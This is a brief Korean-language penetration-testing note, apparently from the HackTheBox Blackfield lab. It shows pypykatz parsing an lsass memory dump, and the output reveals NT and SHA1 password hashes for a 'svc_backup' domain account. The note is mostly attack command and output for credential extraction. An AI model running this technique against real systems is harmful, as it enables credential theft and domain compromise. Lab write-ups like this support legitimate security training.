# lsass Dump

lsass의 경우 미미카츠 혹은 파파카츠를 통해 자격증명 해쉬를 얻을 수 있음&#x20;

```bash
root@kali: pypykatz lsa minidump lsass.DMP
INFO:root:Parsing file lsass.DMP                          
FILE: ======== lsass.DMP =======                          
== LogonSession ==
authentication_id 406458 (633ba)                    
session_id 2
username svc_backup                        
domainname BLACKFIELD                               
logon_server DC01
logon_time 2020-02-23T18:00:03.423728+00:00
sid S-1-5-21-4194615774-2175524697-3563712290-1413  
luid 406458
        == MSV ==                          
                Username: svc_backup                      
                Domain: BLACKFIELD   
                LM: NA                              
                NT: 9658d1d1dcd9250115e2205d9f48400d
                SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c
        == WDIGEST [633ba]==                              
                username svc_backup
                domainname BLACKFIELD
                password None                             
        == SSP [633ba]==             
                username                   
                domainname
                password None
        == Kerberos ==
                Username: svc_backup                      
                Domain: BLACKFIELD.LOCAL   
                Password: None                            
        == WDIGEST [633ba]==                              
                username svc_backup
                domainname BLACKFIELD
                password None
                                                          
== LogonSession ==                                  
authentication_id 365835 (5950b)
session_id 2
username UMFD-2
domainname Font Driver Host
logon_server                                        
logon_time 2020-02-23T17:59:38.218491+00:00                                                                                                                                                                                                
sid S-1-5-96-0-2
...[snip]...
```
